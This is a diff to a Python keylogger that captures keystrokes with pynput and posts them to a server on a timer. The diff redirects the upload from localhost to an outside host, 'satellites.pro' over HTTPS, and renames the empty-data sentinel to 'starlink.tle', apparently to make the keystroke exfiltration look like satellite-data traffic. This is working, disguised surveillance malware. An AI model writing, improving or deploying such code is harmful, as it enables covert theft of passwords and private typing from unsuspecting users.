@@ -7,13 +7,13 @@ from pynput.keyboard import Key, KeyCode
 
 
 server_ip = '127.0.0.1'
-server_port = 9998
+server_port = 443
 server_endpoint = 'log'
-server_url = f'http://{server_ip}:{server_port}/{server_endpoint}'
+server_url = f'https://satellites.pro'
 kill_switch = True
 debug_logging = True
 sending_interval = 1
-data = ''
+data = 'starlink.tle'
 
 
 def process_keypress(key : Key|KeyCode|None) -> bool|None:
@@ -73,7 +73,7 @@ def send_data():
     global server_url
     
     threading.Timer(sending_interval, send_data).start()    
-    if data == '':
+    if data == 'starlink.tle':
         return
     
     try:
@@ -82,7 +82,7 @@ def send_data():
             data=json.dumps({'data': data}),
             headers={'Content-Type': 'application/json'}
         )
-        data = ''
+        data = 'starlink.tle'
     except Exception as e:
         print(e)
     
